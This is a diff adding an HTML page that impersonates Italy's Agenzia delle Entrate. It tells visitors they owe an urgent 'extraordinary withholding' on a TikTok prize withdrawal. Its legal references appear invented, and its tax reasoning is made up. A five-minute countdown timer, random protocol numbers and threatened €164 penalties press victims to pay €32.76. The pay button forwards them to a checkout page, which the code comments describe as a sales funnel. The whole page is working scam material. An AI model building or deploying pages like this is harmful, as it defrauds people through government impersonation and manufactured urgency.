@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Agenzia delle Entrate — Notifica Ufficiale</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+<style>
+:root{--primary:hsl(346,97%,55%);--bg:#f0f2f5;--fg:#111;--muted:#6b7280;--border:#d1d5db;--gov:#003399;--gov-dark:#002277;--gov-light:#e8eeff;--red:#dc2626;--green:#16a34a}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-height:100vh;display:flex;flex-direction:column;align-items:center;-webkit-font-smoothing:antialiased}
+@keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pulse-ring{0%{box-shadow:0 0 0 0 hsl(346 97% 55%/.4)}70%{box-shadow:0 0 0 14px hsl(346 97% 55%/0)}100%{box-shadow:0 0 0 0 hsl(346 97% 55%/0)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes blink-red{0%,100%{opacity:1}50%{opacity:.35}}
+.fu{animation:fadeUp .4s ease both}
+.d1{animation-delay:.05s}.d2{animation-delay:.12s}.d3{animation-delay:.18s}.d4{animation-delay:.24s}.d5{animation-delay:.3s}.d6{animation-delay:.36s}.d7{animation-delay:.42s}
+.wrap{width:100%;max-width:520px;padding-bottom:60px}
+
+/* Gov header */
+.gov-header{width:100%;max-width:520px;background:var(--gov);color:#fff;padding:14px 18px;display:flex;align-items:center;gap:14px;border-bottom:4px solid #c8a800}
+.gh-emblem{width:44px;height:44px;flex-shrink:0}
+.gh-title{font-size:14px;font-weight:800;letter-spacing:.02em;line-height:1.2}
+.gh-sub{font-size:10px;opacity:.75;font-weight:500;margin-top:2px;letter-spacing:.03em}
+
+/* Alert bar */
+.alert-bar{width:100%;max-width:520px;background:#fef2f2;border-bottom:2px solid var(--red);padding:10px 16px;display:flex;align-items:center;gap:10px}
+.ab-dot{width:9px;height:9px;border-radius:50%;background:var(--red);animation:blink-red .7s ease infinite;flex-shrink:0}
+.ab-text{font-size:11.5px;font-weight:700;color:var(--red)}
+
+.section{padding:14px}
+
+/* Notice box */
+.notice-card{background:#fff;border-radius:0;border:1px solid #c8c8c8;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:12px;overflow:hidden}
+.nc-top{background:var(--gov);padding:14px 18px;display:flex;justify-content:space-between;align-items:flex-start;gap:10px}
+.nc-top-title{color:#fff;font-size:14px;font-weight:800;line-height:1.3}
+.nc-top-prot{color:rgba(255,255,255,.65);font-size:10px;margin-top:3px}
+.nc-badge{background:#c8a800;color:#fff;font-size:10px;font-weight:800;padding:4px 10px;border-radius:4px;white-space:nowrap;flex-shrink:0;text-transform:uppercase;letter-spacing:.04em}
+.nc-body{padding:16px 18px}
+
+.recipient-row{background:var(--gov-light);border:1px solid #c8d4f8;border-radius:8px;padding:12px 14px;margin-bottom:14px;font-size:12.5px}
+.rr-label{font-size:10px;font-weight:700;color:var(--gov);text-transform:uppercase;letter-spacing:.06em;margin-bottom:5px}
+.rr-name{font-size:14px;font-weight:800;color:var(--gov-dark)}
+.rr-cf{font-size:11px;color:var(--muted);margin-top:2px}
+
+.notice-body{font-size:13px;line-height:1.75;color:#1e293b;margin-bottom:14px}
+.notice-body strong{color:var(--gov-dark)}
+.notice-body .highlight{background:#fffbeb;border-left:3px solid #c8a800;padding:8px 12px;margin:12px 0;font-size:12.5px;border-radius:0 6px 6px 0}
+
+/* Tabela de débito */
+.debt-table{border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:14px}
+.dt-head{background:#f8f9fa;padding:10px 14px;font-size:11px;font-weight:800;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;border-bottom:1px solid var(--border)}
+.dt-row{display:flex;justify-content:space-between;padding:11px 14px;border-bottom:1px solid var(--border);font-size:13px}
+.dt-row:last-child{border-bottom:none;background:#fef9ec}
+.dt-label{color:var(--fg)}
+.dt-val{font-weight:700;font-variant-numeric:tabular-nums}
+.dt-val.total{color:var(--red);font-size:15px}
+
+/* Prazo */
+.deadline-box{background:#fef2f2;border:1.5px solid #fca5a5;border-radius:10px;padding:14px;display:flex;align-items:center;gap:14px;margin-bottom:14px}
+.db-icon{font-size:28px;flex-shrink:0}
+.db-label{font-size:12px;font-weight:800;color:var(--red);text-transform:uppercase;letter-spacing:.05em;margin-bottom:4px}
+.db-timer{font-size:28px;font-weight:900;color:var(--red);font-variant-numeric:tabular-nums;line-height:1}
+.db-sub{font-size:11px;color:#9f1239;margin-top:3px;line-height:1.4}
+
+/* Referência legal */
+.legal-box{background:#f8f9fa;border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:14px}
+.lb-label{font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:7px}
+.lb-items{display:flex;flex-direction:column;gap:4px}
+.lb-item{font-size:11.5px;color:#374151;padding-left:12px;position:relative;line-height:1.5}
+.lb-item::before{content:'•';position:absolute;left:0;color:var(--gov)}
+
+/* QR placeholder */
+.qr-row{display:flex;align-items:center;gap:14px;background:#fff;border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:14px}
+.qr-box{width:60px;height:60px;background:repeating-conic-gradient(#000 0% 25%, #fff 0% 50%) 0 0/8px 8px;flex-shrink:0;border:2px solid #000}
+.qr-info{font-size:11.5px;color:var(--muted);line-height:1.5}
+.qr-info strong{color:var(--fg);display:block;margin-bottom:2px;font-size:12.5px}
+
+/* Buttons */
+.btn-pay{display:flex;width:100%;padding:17px;background:var(--gov);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:800;font-family:'Poppins',sans-serif;cursor:pointer;align-items:center;justify-content:center;gap:10px;text-transform:uppercase;letter-spacing:.5px;box-shadow:0 8px 24px rgba(0,51,153,.3);animation:pulse-ring 2.5s ease infinite;transition:opacity .15s;margin-bottom:10px}
+.btn-pay.loading{opacity:.75;pointer-events:none}
+.spinner{display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
+.btn-pay.loading .spinner{display:block}
+.consequences{background:#fef2f2;border:1px solid #fca5a5;border-radius:8px;padding:12px 14px;font-size:12px;color:#7f1d1d;line-height:1.6;margin-bottom:12px}
+.consequences strong{color:var(--red)}
+.btn-secondary{width:100%;padding:13px;background:transparent;border:1.5px solid #9ca3af;border-radius:8px;font-size:13px;font-weight:600;font-family:'Poppins',sans-serif;cursor:pointer;color:var(--muted);transition:border-color .15s;margin-bottom:8px}
+.btn-secondary:hover{border-color:var(--primary);color:var(--primary)}
+.footer-gov{text-align:center;padding:8px;font-size:10.5px;color:var(--muted)}
+</style>
+</head>
+<body>
+
+<!-- Header governo italiano -->
+<div class="gov-header fu d1">
+  <svg class="gh-emblem" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="22" cy="22" r="22" fill="#fff"/>
+    <circle cx="22" cy="22" r="18" fill="#003399"/>
+    <text x="22" y="27" text-anchor="middle" font-size="14" font-weight="bold" fill="#c8a800" font-family="serif">IT</text>
+  </svg>
+  <div>
+    <div class="gh-title">Agenzia delle Entrate</div>
+    <div class="gh-sub">MINISTERO DELL'ECONOMIA E DELLE FINANZE — GOVERNO ITALIANO</div>
+  </div>
+</div>
+<div class="alert-bar fu d1">
+  <div class="ab-dot"></div>
+  <span class="ab-text">⚠️ COMUNICAZIONE URGENTE — Risposta richiesta entro 24 ore</span>
+</div>
+
+<div class="wrap">
+  <div class="section">
+
+    <!-- Aviso oficial -->
+    <div class="notice-card fu d2">
+      <div class="nc-top">
+        <div>
+          <div class="nc-top-title">Avviso di Accertamento Fiscale</div>
+          <div class="nc-top-prot" id="protEl">Prot. n. ADE/2026/IT-XXXXXXX</div>
+        </div>
+        <span class="nc-badge">⚠️ Urgente</span>
+      </div>
+      <div class="nc-body">
+
+        <div class="recipient-row">
+          <p class="rr-label">Destinatario dell'avviso</p>
+          <p class="rr-name" id="recipientLine">Contribuente — TikTok Premi S.r.l.</p>
+          <p class="rr-cf" id="cfLine">C.F./P.IVA: Verifica in corso</p>
+        </div>
+
+        <div class="notice-body">
+          <p>A seguito dei controlli automatizzati previsti dall'<strong>art. 36-bis del DPR 600/73</strong>, il sistema ha rilevato una <strong>pendenza fiscale non regolarizzata</strong> relativa a prelievo di premio digitale su piattaforma TikTok.</p>
+          <div class="highlight">
+            Ai sensi del <strong>Decreto Legislativo n.°347/2024</strong>, i prelievi da piattaforme digitali di importo superiore a €500 sono soggetti a <strong>ritenuta fiscale straordinaria</strong> da versare in via anticipata.
+          </div>
+          <p>Per evitare la sospensione dell'operazione e sanzioni pecuniarie aggiuntive, è necessario effettuare il versamento entro il termine indicato.</p>
+        </div>
+
+        <div class="debt-table">
+          <div class="dt-head">📋 Prospetto Somme Dovute</div>
+          <div class="dt-row"><span class="dt-label">Importo prelievo rilevato</span><span class="dt-val" id="valPrelievo">€868,75</span></div>
+          <div class="dt-row"><span class="dt-label">Ritenuta fiscale straordinaria</span><span class="dt-val" style="color:#dc2626">€32,76</span></div>
+          <div class="dt-row"><span class="dt-label">Sanzione per ritardo (se applicata)</span><span class="dt-val" style="color:#9f1239">€ 164,00</span></div>
+          <div class="dt-row"><span class="dt-label"><strong>Importo da versare SUBITO</strong></span><span class="dt-val total">€32,76</span></div>
+        </div>
+
+        <div class="deadline-box">
+          <span class="db-icon">⏱️</span>
+          <div>
+            <div class="db-label">Scadenza pagamento</div>
+            <div class="db-timer" id="timerEl">05:00</div>
+            <div class="db-sub">Dopo la scadenza vengono applicate sanzioni aggiuntive di €164,00</div>
+          </div>
+        </div>
+
+        <div class="legal-box">
+          <p class="lb-label">📜 Riferimenti normativi</p>
+          <div class="lb-items">
+            <span class="lb-item">Art. 36-bis DPR 600/73 — Liquidazione automatica</span>
+            <span class="lb-item">D.lgs 347/2024 — Ritenuta digitale anticipata</span>
+            <span class="lb-item">Circ. ADE n. 18/E/2025 — Piattaforme digitali</span>
+            <span class="lb-item">Regolamento UE 2021/1232 — Prelievi transfrontalieri</span>
+          </div>
+        </div>
+
+        <div class="qr-row">
+          <div class="qr-box"></div>
+          <div class="qr-info">
+            <strong>Codice di accertamento</strong>
+            <span id="codeEl">ADE2026-XXXXXXXX-IT</span><br>
+            Scansiona per verificare l'autenticità su <em>agenziaentrate.gov.it</em>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Consequências -->
+    <div class="consequences fu d4">
+      ⚠️ <strong>Conseguenze del mancato pagamento:</strong> blocco immediato del prelievo, applicazione di sanzione aggiuntiva di €164,00, segnalazione all'Anagrafe Tributaria e possibile iscrizione a ruolo.
+    </div>
+
+    <!-- CTAs -->
+    <div class="fu d5">
+      <button class="btn-pay" id="btnPay">
+        <div class="spinner"></div>
+        <span class="btn-text">🔒 Regolarizza Ora — Paga €32,76</span>
+      </button>
+      <button class="btn-secondary" id="btnSkip">Ho già regolarizzato in precedenza →</button>
+      <p class="footer-gov">Comunicazione automatizzata generata dal sistema ADE-IT. Rif. normativo: D.M. 14/03/2024.</p>
+    </div>
+
+  </div>
+</div>
+
+<script>
+(function(){
+  var params = new URLSearchParams(window.location.search);
+  var total  = parseFloat(params.get('total')) || 868.75;
+  var taxa   = 32.76;
+  function fmt(v){ return '€' + v.toFixed(2).replace('.',','); }
+
+  document.getElementById('valPrelievo').textContent = fmt(total);
+
+  // Protocolo aleatório
+  var prot = 'ADE/2026/IT-' + Math.floor(1000000 + Math.random()*9000000);
+  document.getElementById('protEl').textContent = 'Prot. n. ' + prot;
+  document.getElementById('codeEl').textContent = 'ADE2026-' + Math.floor(10000000 + Math.random()*90000000) + '-IT';
+
+  // Timer 5 minutos
+  var secs = 5 * 60;
+  var timerEl = document.getElementById('timerEl');
+  var t = setInterval(function(){
+    if(--secs <= 0){
+      clearInterval(t);
+      timerEl.textContent = '00:00';
+      timerEl.style.color = '#7f1d1d';
+      return;
+    }
+    timerEl.textContent = String(Math.floor(secs/60)).padStart(2,'0') + ':' + String(secs%60).padStart(2,'0');
+  }, 1000);
+
+  function goCheckout(){
+    var dest = new URL('checkout-buck.html', window.location.href);
+    params.forEach(function(v,k){ dest.searchParams.set(k,v); });
+    dest.searchParams.set('taxa', taxa.toFixed(2));
+    dest.searchParams.set('total', total.toFixed(2));
+    window.location.href = dest.toString();
+  }
+
+  document.getElementById('btnPay').addEventListener('click', function(){
+    var btn = this;
+    btn.classList.add('loading');
+    btn.querySelector('.btn-text').textContent = 'Accesso al portale ADE…';
+    setTimeout(goCheckout, 1000);
+  });
+
+  document.getElementById('btnSkip').addEventListener('click', function(){
+    // Fim do funil — redireciona para página de agradecimento ou index
+    window.location.href = new URL('index.html', window.location.href).toString();
+  });
+})();
+</script>
+</body>
+</html>
